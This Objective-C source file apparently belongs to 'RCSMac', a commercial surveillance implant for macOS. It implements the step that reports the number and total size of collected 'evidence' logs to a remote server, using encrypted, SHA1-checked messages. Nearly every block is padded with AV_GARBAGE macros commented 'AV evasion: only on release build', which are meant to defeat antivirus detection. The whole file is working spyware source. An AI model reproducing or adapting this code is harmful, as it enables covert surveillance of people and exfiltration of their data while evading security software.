/*
 * SizeNetworkOperation.m
 * RCSMac
 * PROTO_EVIDENCE_SIZE state/message
 *
 *
 * Created by J on 04/04/2014
 * Copyright (C) HT srl 2014. All rights reserved
 *
 */


#import "RCSMCommon.h"

#import "SizeNetworkOperation.h"

#import "NSMutableData+AES128.h"
#import "RCSMLogManager.h"
#import "RCSMDiskQuota.h"

#import "NSString+SHA1.h"
#import "NSData+SHA1.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

@interface SizeNetworkOperation (private)

- (BOOL)_sendLogContent: (NSArray *)aArray;

@end

@implementation SizeNetworkOperation (private)

- (BOOL)_sendLogContent: (NSArray *)aArray
{
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    uint32_t command              = PROTO_EVIDENCE_SIZE;
    NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
    
    //
    // message = PROTO_EVIDENCE_SIZE | tot_num | tot_size | sha
    //
    NSMutableData *commandData    = [[NSMutableData alloc] initWithBytes: &command
                                                                  length: sizeof(uint32_t)];
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    uint32_t evidenceNumber = [aArray count];
#ifdef DEBUG_SIZE_NOP
    infoLog(@"total evidence num: %i",evidenceNumber);
#endif
    uint64_t evidenceSize = 0;
    if (evidenceNumber >0)
    {
        for (NSDictionary *element in aArray)
        {
            NSString *logName = [[element objectForKey: @"logName"] copy];
            //if ([[NSFileManager defaultManager] fileExistsAtPath: logName] == TRUE)
            if(logName != nil)
            {
                //evidenceSize += [[[NSFileManager defaultManager] attributesOfItemAtPath:logName error:nil ]fileSize];
                NSDictionary *attributes = [[NSFileManager defaultManager] attributesOfItemAtPath:logName error:nil ];
                if(attributes != nil)
                {
                    evidenceSize += [attributes fileSize];
                }
            }
        }
    }
    [commandData appendBytes: &evidenceNumber length:sizeof(uint32_t)];
    [commandData appendBytes: &evidenceSize length:sizeof(uint64_t)];
    AV_GARBAGE_002
    
    NSData *commandSha            = [commandData sha1Hash];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    [commandData appendData: commandSha];
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    [commandData encryptWithKey: gSessionKey];
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    //
    // Send encrypted message
    //
    NSURLResponse *urlResponse    = nil;
    NSData *replyData             = nil;
    NSMutableData *replyDecrypted = nil;
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    replyData = [mTransport sendData: commandData
                   returningResponse: urlResponse];
    
    // AV evasion: only on release build
    AV_GARBAGE_009
    
    if (replyData == nil)
    {
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        [commandData release];
        [outerPool release];
        
        // AV evasion: only on release build
        AV_GARBAGE_003
        
        return NO;
    }
    
    replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    [replyDecrypted decryptWithKey: gSessionKey];
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    [replyDecrypted getBytes: &command
                      length: sizeof(uint32_t)];
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    // remove padding
    [replyDecrypted removePadding];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    //
    // check integrity
    //
    NSData *shaRemote;
    NSData *shaLocal;
    
    @try
    {
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        shaRemote = [replyDecrypted subdataWithRange:
                     NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                                 CC_SHA1_DIGEST_LENGTH)];
        
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        shaLocal = [replyDecrypted subdataWithRange:
                    NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
    @catch (NSException *e)
    {
        // AV evasion: only on release build
        AV_GARBAGE_003
        
        [replyDecrypted release];
        [commandData release];
        [outerPool release];
        
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        return NO;
    }
    
    shaLocal = [shaLocal sha1Hash];
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    if ([shaRemote isEqualToData: shaLocal] == NO)
    {
        // AV evasion: only on release build
        AV_GARBAGE_003
        
        [replyDecrypted release];
        [commandData release];
        [outerPool release];
        
        // AV evasion: only on release build
        AV_GARBAGE_006
        
        return NO;
    }
    
    
    if (command != PROTO_OK)
    {
        // AV evasion: only on release build
        AV_GARBAGE_007
        
        [replyDecrypted release];
        [commandData release];
        [outerPool release];
        
        // AV evasion: only on release build
        AV_GARBAGE_009
        
        return NO;
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    [replyDecrypted release];
    [commandData release];
    [outerPool release];
    
    // AV evasion: only on release build
    AV_GARBAGE_002


    return YES;
}

@end


@implementation SizeNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
               minDelay: (uint32_t)aMinDelay
               maxDelay: (uint32_t)aMaxDelay
              bandwidth: (uint32_t)aBandwidth
{
    if (self = [super init])
    {
        mTransport = aTransport;
        
        mMinDelay           = aMinDelay;
        mMaxDelay           = aMaxDelay;
        mBandwidthLimit     = aBandwidth;
        
        // AV evasion: only on release build
        AV_GARBAGE_005
        
        return self;
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    return nil;
}

- (void)dealloc
{
    [super dealloc];
}

- (BOOL)perform: (NSArray *) aArray
{

    NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
    
    BOOL retVal = [self _sendLogContent:aArray];
    
    [outerPool release];
    
    //return YES;
    return retVal;
    
}

- (BOOL)perform
{
    return YES;
}

@end
